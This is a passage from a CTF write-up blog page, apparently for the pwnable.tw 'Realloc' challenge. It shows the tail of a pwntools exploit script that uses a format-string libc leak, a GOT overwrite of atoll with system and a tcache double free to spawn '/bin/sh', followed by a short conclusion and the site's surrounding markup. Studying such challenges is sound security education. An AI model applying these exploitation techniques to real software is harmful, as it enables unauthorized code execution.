class="built_in">str</span>(offset) + <span class="string">&#x27;$p&#x27;</span></span><br><span class="line">    io.sendline(f_str)</span><br><span class="line">    val = io.readline().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    print(val)</span><br><span class="line">    addr = val[<span class="number">7</span>:<span class="number">21</span>].strip()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(addr, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_base</span>():</span></span><br><span class="line">    libc = ELF(LIBC_BIN)</span><br><span class="line">    libc_start_main = leak_stack(<span class="number">21</span>)</span><br><span class="line">    log.info(<span class="string">&#x27;Libc main : &#x27;</span> + <span class="built_in">hex</span>(libc_start_main))</span><br><span class="line">    libc_base = libc_start_main - <span class="number">0x26b6b</span></span><br><span class="line">    log.info(<span class="string">&#x27;Libc Base : &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    log.info(<span class="string">&#x27;System : &#x27;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line">    <span class="keyword">return</span> system_addr</span><br><span class="line"></span><br><span class="line">system_addr = leak_base()</span><br><span class="line"></span><br><span class="line">app.alloc(<span class="string">&#x27;&#x27;</span>, p64(system_addr), <span class="string">&#x27;A&#x27;</span>*<span class="number">10</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">io.readuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="flag.png" alt="Exploit execution results"></p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>This challenge was very tricking to exploit. We had to use many tricks to do a libc leak such as GOT table patching and the using format string not to mention the tcache double free. Once we have done the libc leak we used it to calculate the system function address, again we patch the atoll function with the system function an got the system shell.</p></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/Linux/">Linux</a><a class="link-muted mr-2" rel="tag" href="/tags/CTF/">CTF</a><a class="link-muted mr-2" rel="tag" href="/tags/pwnable/">pwnable</a><a class="link-muted mr-2" rel="tag" href="/tags/pwnable-tw/">pwnable-tw</a><a class="link-muted mr-2" rel="tag" href="/tags/WarGames/">WarGames</a><a class="link-muted mr-2" rel="tag" href="/tags/Heap-Exploitation/">Heap Exploitation</a></div></article></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2020/07/11/binary-exploitation-pwnable-tw-spirited-away/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">Binary Exploitation [pwnable.tw] - Spirited Away</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2020/07/04/binary-exploitation-pwnable-tw-babystack/"><span class="level-item">Binary Exploitation [pwnable.tw] - BabyStack</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">Comments</h3><div id="disqus_thread"><noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div><script>var disqus_config=function(){this.page.url="https://www.taintedbits.com/2020/07/05/binary-exploitation-pwnable-tw-realloc/",this.page.identifier="/2020/07/05/binary-exploitation-pwnable-tw-realloc/"};!function(){var t=document,e=t.createElement("script");e.src="//taintedbits.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen order-1"><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">Catalogue</h3><ul class="menu-list"><li><a class="level is-mobile" href="#Challange-Description"><span class="level-left"><span class="level-item">1</span><span class="level-item">Challange Description</span></span></a></li><li><a class="level is-mobile" href="#Binary-Protection"><span class="level-left"><span class="level-item">2</span><span class="level-item">Binary Protection</span></span></a></li><li><a class="level is-mobile" href="#Vulnerable-Application"><span class="level-left"><span class="level-item">3</span><span class="level-item">Vulnerable Application</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#Malloc-Spec"><span class="level-left"><span class="level-item">3.1</span><span class="level-item">Malloc Spec</span></span></a></li></ul></li><li><a class="level is-mobile" href="#Challenge-Constraints"><span class="level-left"><span class="level-item">4</span><span class="level-item">Challenge Constraints</span></span></a></li><li><a class="level is-mobile" href="#Vulnerable-Code"><span class="level-left"><span class="level-item">5</span><span class="level-item">Vulnerable Code</span></span></a></li><li><a class="level is-mobile" href="#Arbitrary-Write"><span class="level-left"><span class="level-item">6</span><span class="level-item">Arbitrary Write</span></span></a></li><li><a class="level is-mobile" href="#The-Leak"><span class="level-left"><span class="level-item">7</span><span class="level-item">The Leak</span></span></a></li><li><a class="level is-mobile" href="#Code-Execution"><span class="level-left"><span class="level-item">8</span><span class="level-item">Code Execution</span></span></a></li><li><a class="level is-mobile" href="#Exploit"><span class="level-left"><span class="level-item">9</span><span class="level-item">Exploit</span></span></a></li><li><a class="level is-mobile" href="#Conclusion"><span class="level-left"><span class="level-item">10</span><span class="level-item">Conclusion</span></span></a></li></ul></div></div><style>#toc .menu-list>li>a.is-active+.menu-list{display:block}#toc .menu-list>li>a+.menu-list{display:none}</style><script src="/js/toc.js" defer></script></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content"><p class="date"><time datetime="2021-02-14T18:30:00.000Z">2021-02-15</time></p><p class="title"><a href="/2021/02/15/arm-architecture-webinar/">ARM Architecture and Shellcode Webinars</a></p><p class="categories"><a href="/categories/Binary-Exploitation/">Binary Exploitation</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time datetime="2020-07-17T18:30:00.000Z">2020-07-18</time></p><p class="title"><a href="/2020/07/18/binary-exploitation-pwnable-tw-tcache-tear/">Binary Exploitation [pwnable.tw] - Tcache Tear</a></p><p class="categories"><a href="/categories/CTF-Writeups/">CTF Writeups</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time datetime="2020-07-11T18:30:00.000Z">2020-07-12</time></p><p class="title"><a href="/2020/07/12/binary-exploitation-pwnable-tw-caov/">Binary Exploitation [pwnable.tw] - CAOV</a></p><p class="categories"><a href="/categories/CTF-Writeups/">CTF Writeups</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time datetime="2020-07-10T18:30:00.000Z">2020-07-11</time></p><p class="title"><a href="/2020/07/11/binary-exploitation-pwnable-tw-spirited-away/">Binary Exploitation [pwnable.tw] - Spirited Away</a></p><p class="categories"><a href="/categories/CTF-Writeups/">CTF Writeups</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time datetime="2020-07-04T18:30:00.000Z">2020-07-05</time></p><p class="title"><a href="/2020/07/05/binary-exploitation-pwnable-tw-realloc/">Binary Exploitation [pwnable.tw] - Realloc</a></p><p class="categories"><a href="/categories/CTF-Writeups/">CTF Writeups</a></p></div></article></div></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">Categories</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/Binary-Exploitation/"><span class="level-start"><span class="level-item">Binary Exploitation</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/Brain-Logs/"><span class="level-start"><span class="level-item">Brain Logs</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/CTF-Writeups/"><span class="level-start"><span class="level-item">CTF Writeups</span></span><span class="level-end"><span class="level-item tag">13</span></span></a></li><li><a class="level is-mobile" href="/categories/Exploitation/"><span class="level-start"><span class="level-item">Exploitation</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/IoT/"><span class="level-start"><span class="level-item">IoT</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile" href="/categories/Machine-Learning/"><span class="level-start"><span class="level-item">Machine Learning</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/categories/Malware-Analysis/"><span class="level-start"><span class="level-item">Malware Analysis</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/categories/NLP/"><span class="level-start"><span class="level-item">NLP</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/Reverse-Engineering/"><span class="level-start"><span class="level-item">Reverse Engineering</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">Tags</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/ACS712/"><span class="tag">ACS712</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Arduino/"><span class="tag">Arduino</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Bare-Metal/"><span class="tag">Bare-Metal</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/CTF/"><span class="tag">CTF</span><span class="tag">13</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Chat-Bots/"><span class="tag">Chat Bots</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Classification/"><span class="tag">Classification</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Data-Wrangling/"><span class="tag">Data Wrangling</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Dev/"><span class="tag">Dev</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Dropper/"><span class="tag">Dropper</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ESP8266/"><span class="tag">ESP8266</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Editor/"><span class="tag">Editor</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Emacs/"><span class="tag">Emacs</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Exploitation/"><span class="tag">Exploitation</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/GandCrab/"><span class="tag">GandCrab</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Grey-Energy/"><span class="tag">Grey Energy</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Heap-Exploitation/"><span class="tag">Heap Exploitation</span><span class="tag">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Kernel-Debugging/"><span class="tag">Kernel Debugging</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Linux/"><span class="tag">Linux</span><span class="tag">15</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Linux-Malware/"><span class="tag">Linux Malware</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Malware-Analysis/"><span class="tag">Malware Analysis</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Python/"><span class="tag">Python</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ROP/"><span class="tag">ROP</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Regression/"><span class="tag">Regression</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Reverse-Engineering/"><span class="tag">Reverse Engineering</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Visualization/"><span class="tag">Visualization</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/WarGames/"><span class="tag">WarGames</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Windows-Malware/"><span class="tag">Windows Malware</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Windows-Reversing/"><span class="tag">Windows Reversing</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/glibc/"><span class="tag">glibc</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/javascript-obfuscation/"><span class="tag">javascript obfuscation</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pwnable/"><span class="tag">pwnable</span><span class="tag">13</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pwnable-kr/"><span class="tag">pwnable-kr</span><span class="tag">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pwnable-tw/"><span class="tag">pwnable-tw</span><span class="tag">6</span></a></div><div class="control"><a class="tags has-addons" href="/tags/radare2/"><span class="tag">radare2</span><span class="tag">4</span></a></div></div></div></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/images/logo-header.png" alt="Tainted Bits" height="28"></a><p class="is-size-7"><span>&copy; 2021 D3xt3r</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by-sa/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Subscribe" href="https://mailchi.mp/d744c1f04904/taintedbits"><i class="fa fa-envelope"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/0xd3xt3r"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en")</script><script>var IcarusThemeSettings={article:{highlight:{clipboard:!0,fold:"unfolded"}}}</script><script src="/js/column.js"></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load",()=>{"function"==typeof $.fn.lightGallery&&$(".article").lightGallery({selector:".gallery-item"}),"function"==typeof $.fn.justifiedGallery&&($(".justified-gallery > p > .gallery-item").length&&$(".justified-gallery > p > .gallery-item").unwrap(),$(".justified-gallery").justifiedGallery())})</script><div id="outdated"><h6>Your browser is out-of-date!</h6><p>Update your browser to view this website correctly.&amp;npsb;<a id="btnUpdateBrowser" target="_blank" rel="noopener" href="http://outdatedbrowser.com/">Update my browser now</a></p><p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">×</a></p></div><script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script><script>window.addEventListener("load",(function(){outdatedBrowser({bgColor:"#f25648",color:"#ffffff",lowerThan:"object-fit"})}))</script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener("DOMContentLoaded",(function(){loadInsight({contentUrl:"/content.json"},{hint:"Type something...",untitled:"(Untitled)",posts:"Posts",pages:"Pages",categories:"Categories",tags:"Tags"})}))</script></body></html>